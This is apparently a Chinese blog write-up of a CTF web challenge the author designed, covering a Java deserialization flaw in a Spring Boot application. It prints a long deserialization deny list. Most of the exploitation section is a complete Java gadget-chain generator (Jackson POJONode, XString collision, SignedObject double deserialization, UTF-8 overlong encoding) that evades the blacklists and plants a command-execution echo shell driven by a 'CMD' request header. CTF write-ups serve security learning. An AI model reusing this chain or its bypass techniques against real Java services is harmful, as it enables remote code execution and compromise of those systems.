---
title: 记一次CTF出题之-ez_check_WP篇
date: 2025-06-09 18:53:00 +0800
img_path: /
categories: [CTF, CTF出题记录]
tags: [CTF, CTF出题记录]  


---

# WEB-ez_check

## 一、查看题目信息

题目给出一个`jar`包，默认访问界面如下：

![image-20250408210313683](assets/image-20250408210313683.png)

## 二、题目分析



ReadObjectController中存在明显的反序列化漏洞。

![image-20250408210426023](assets/image-20250408210426023.png)

在进入反序列化操作之前会通过KmpCheck方法通过字符串匹配的黑名单方式判断是否存在黑名单字符串。

黑名单如下：

```java
bsh.
ch.qos.logback.core.db.
clojure.
com.alibaba.citrus.springext.support.parser.
com.alibaba.citrus.springext.util.SpringExtUtil.
com.alibaba.druid.pool.
com.alibaba.hotcode.internal.org.apache.commons.collections.functors.
com.alipay.custrelation.service.model.redress.
com.alipay.oceanbase.obproxy.druid.pool.
com.caucho.config.types.
com.caucho.hessian.test.
com.caucho.naming.
com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.
com.ibm.xltxe.rnm1.xtq.bcel.util.
com.mchange.v2.c3p0.
com.mysql.jdbc.util.
com.rometools.rome.feed.
com.sun.corba.se.impl.
com.sun.corba.se.spi.orbutil.
com.sun.jndi.ldap
com.sun.jndi.rmi.
com.sun.jndi.toolkit.
com.sun.org.apache.bcel.internal.
com.sun.org.apache.xalan.internal.
com.sun.rowset.
com.sun.xml.internal.bind.v2.
com.taobao.vipserver.commons.collections.functors.
groovy.lang.
java.awt.
java.beans.
java.lang.ProcessBuilder
java.lang.Runtime
java.rmi.server.
java.security.
java.util.ServiceLoader
java.util.StringTokenizer
javassist.bytecode.annotation.
javassist.tools.web.Viewer
javassist.util.proxy.
javax.imageio.
javax.imageio.spi.
javax.management.
javax.media.jai.remote.
javax.naming.
javax.script.
javax.sound.sampled.
javax.swing.
net.bytebuddy.dynamic.loading.
oracle.jdbc.connector.
oracle.jdbc.pool.
org.apache.aries.transaction.jms.
org.apache.bcel.util.
org.apache.carbondata.core.scan.expression.
org.apache.commons.beanutils.
org.apache.commons.codec.binary.
org.apache.commons.collections.functors.
org.apache.commons.collections4.functors.
org.apache.commons.codec.
org.apache.commons.configuration.
org.apache.commons.configuration2.
org.apache.commons.dbcp.datasources.
org.apache.commons.dbcp2.datasources.
org.apache.commons.fileupload.disk.
org.apache.ibatis.executor.loader.
org.apache.ibatis.javassist.bytecode.
org.apache.ibatis.javassist.tools.
org.apache.ibatis.javassist.util.
org.apache.ignite.cache.
org.apache.log.output.db.
org.apache.log4j.receivers.db.
org.apache.myfaces.view.facelets.el.
org.apache.openjpa.ee.
org.apache.shiro.
org.apache.tomcat.dbcp.
org.apache.velocity.runtime.
org.apache.velocity.
org.apache.wicket.util.
org.apache.xalan.xsltc.trax.
org.apache.xbean.naming.context.
org.apache.xpath.
org.apache.zookeeper.
org.aspectj.
org.codehaus.groovy.runtime.
org.datanucleus.store.rdbms.datasource.dbcp.datasources.
org.dom4j.
org.eclipse.jetty.util.log.
org.geotools.filter.
org.h2.value.
org.hibernate.tuple.component.
org.hibernate.type.
org.jboss.ejb3.
org.jboss.proxy.ejb.
org.jboss.resteasy.plugins.server.resourcefactory.
org.jboss.weld.interceptor.builder.
org.junit.
org.mockito.internal.creation.cglib.
org.mortbay.log.
org.mockito.
org.thymeleaf.
org.quartz.
org.springframework.aop.aspectj.
org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler
org.springframework.beans.factory.
org.springframework.expression.spel.
org.springframework.jndi.
org.springframework.orm.
org.springframework.transaction.
org.yaml.snakeyaml.tokens.
ognl.
pstore.shaded.org.apache.commons.collections.
sun.print.
sun.rmi.server.
sun.rmi.transport.
weblogic.ejb20.internal.
weblogic.jms.common.
```

同时通过SafeObjectInputStream来校验反序列化的类是否为如下的黑名单

![image-20250408211056856](assets/image-20250408211056856.png)

其次查看pom.xml中的依赖，并未直接引入除去SpringBoot之外的其他依赖：

![image-20250408211248050](assets/image-20250408211248050.png)

但反编译看到lib中存在springboot引入的jackson依赖

![image-20250408211506930](assets/image-20250408211506930.png)

所以这里便可通过Jackson来调用任意的getter方法，但是需要一个可以调用toString的方法，类校验的黑名单中

存在javax.management.BadAttributeValueExpException，所以需要一个jdk中存在的可调用toString的gadget。

至于字符串的黑名单可通过Hessian UTF-8 Overlong Encoding的方法去绕过，再就是类校验中的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl的问题，可通过SignedObject二次反序列化来绕过，需要注意的是二次反序列化的字节码也需要进行UTF-8 Overlong Encoding进行绕过。

## 三、漏洞利用

payload生成如下：

```java
package ysoserial.jackson;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.Signature;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.UUID;

public class XStringToJackson {
    public static Object makeTemplatesImplAopProxy(Object templatesImpl) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }
    public static HashMap makeMap(Object v1, Object v2) throws Exception {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);

        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException var6) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }

        Constructor nodeCons = nodeC.getDeclaredConstructor(Integer.TYPE, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
    public static Object listWrap(Object getterObject, Object originObj) throws Exception {
        ArrayList<Object> list = new ArrayList();
        list.add(getterObject);
        list.add(originObj);
        return list;
    }
    public static Method getMethod(Object obj, String methodName, Class<?>[] paramTypes) {
        Class clazz = obj.getClass();
        Method method = null;

        try {
            method = obj.getClass().getDeclaredMethod(methodName, paramTypes);
        } catch (NoSuchMethodException ignored) {
        }
        while(method == null && clazz != Object.class) {
            try {
                method = clazz.getDeclaredMethod(methodName, paramTypes);
            } catch (NoSuchMethodException var6) {
                clazz = clazz.getSuperclass();
            }
        }

        if (method == null) {
            return null;
        } else {
            method.setAccessible(true);
            return method;
        }
    }
    //XString 碰撞hash ，调用obj的toString方法
    public static Object getHashMap(Object obj) throws Exception {
        XString xstring = new XString("");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();

        map1.put("yy", xstring);
        map1.put("zZ", obj);

        map2.put("zZ", xstring);
        map2.put("yy", obj);
        HashMap map = makeMap(map1, map2);
        return map;
    }
    // 序列化时，对字符串进行UTF-8编码，导致长度超出预期，触发异常，进而绕过字符串校验触发反序列化。
    public static byte[] serializeOverlongEncoding(Object obj) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new UTF8OverlongObjectOutputStream(out);
        outputStream.writeObject(obj);
        return out.toByteArray();
    }
    public static CtClass genPayloadForWin() throws NotFoundException, CannotCompileException, IOException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("Exp");

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public SpringEcho() throws Exception {\n" +
            "            try {\n" +
            "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
            "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
            "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
            "\n" +
            "                String te = httprequest.getHeader(\"Host\");\n" +
            "                httpresponse.addHeader(\"Host\", te);\n" +
            "                String tc = httprequest.getHeader(\"CMD\");\n" +
            "                if (tc != null && !tc.isEmpty()) {\n" +
            "                    String[] cmd = new String[]{\"cmd.exe\", \"/c\", tc};  \n" +
            "                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
            "                    httpresponse.getWriter().write(new String(result));\n" +
            "\n" +
            "                }\n" +
            "                httpresponse.getWriter().flush();\n" +
            "                httpresponse.getWriter().close();\n" +
            "            } catch (Exception e) {\n" +
            "                e.getStackTrace();\n" +
            "            }\n" +
            "        }", clazz));

        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }
    public static void main(String[] args) throws Exception {
        byte[] bytecodes = genPayloadForWin().toBytecode();
        Object templates =  TemplatesImpl.class.newInstance();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{bytecodes});
        Reflections.setFieldValue(templates, "_name", UUID.randomUUID().toString());
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 动态代理TemplatesImpl对象，防止不稳定触发的情况
        Object getter = makeTemplatesImplAopProxy(templates);
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();
        Object tostring1 = new POJONode(getter);

        HashMap map = (HashMap) getHashMap(tostring1);
        Object serObject = listWrap(getter, map);

        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        java.security.SignedObject signedObject = new java.security.SignedObject(1, privateKey, signingEngine);
        byte[] ser1 = null;
        ser1 = (byte[]) Class.forName("ysoserial.jackson.XStringToJackson").getDeclaredMethod("serializeOverlongEncoding", Object.class).invoke(null, serObject);
        Reflections.setFieldValue(signedObject, "content", ser1);
        getMethod(signedObject, "sign", new Class[]{PrivateKey.class, Signature.class}).invoke(signedObject, privateKey, signingEngine);

        Object tostring =  new POJONode(signedObject);

        HashMap map2 = (HashMap) getHashMap(tostring);
        Object ser = listWrap((Object) signedObject, map2);
        //获取序列化
        byte[] serialize = serializeOverlongEncoding(ser);
        System.out.println(new String(serialize));
        System.out.println(Base64.getEncoder().encodeToString(serialize));

        ByteArrayInputStream btin = new ByteArrayInputStream(serialize);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        objIn.readObject();

    }
}
```



![image-20250408212248566](assets/image-20250408212248566.png)